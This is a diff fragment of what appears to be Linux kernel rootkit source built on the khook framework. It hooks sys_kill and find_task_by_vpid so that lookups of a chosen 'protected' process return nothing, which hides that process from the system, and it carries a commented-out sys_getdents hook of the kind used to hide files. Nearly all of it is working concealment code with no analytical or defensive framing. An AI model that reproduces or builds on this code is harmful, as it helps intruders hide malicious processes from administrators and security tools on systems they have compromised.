@@ -205,20 +205,9 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-// KHOOK(find_task_by_vpid);
-// struct task_struct *khook_find_task_by_vpid(pid_t vnr)
-// {
-// 	struct task_struct *tsk = NULL;
-
-// 	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
-// 	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
-// 		tsk = NULL;
-
-// 	return tsk;
-// }
-
-KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
-static task_struct *khook_find_task_by_vpid(pid_t vnr){
+KHOOK(find_task_by_vpid);
+struct task_struct *khook_find_task_by_vpid(pid_t vnr)
+{
 	struct task_struct *tsk = NULL;
 	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
 	find_pid();
@@ -226,6 +215,16 @@ static task_struct *khook_find_task_by_vpid(pid_t vnr){
 	if(protected_pid==vnr) tsk=NULL; 
 	return tsk;
 }
+
+// KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
+// static task_struct *khook_find_task_by_vpid(pid_t vnr){
+// 	struct task_struct *tsk = NULL;
+// 	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
+// 	find_pid();
+// 	printk("pid:%d", protected_pid);
+// 	if(protected_pid==vnr) tsk=NULL; 
+// 	return tsk;
+// }
 
 // KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
 // static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
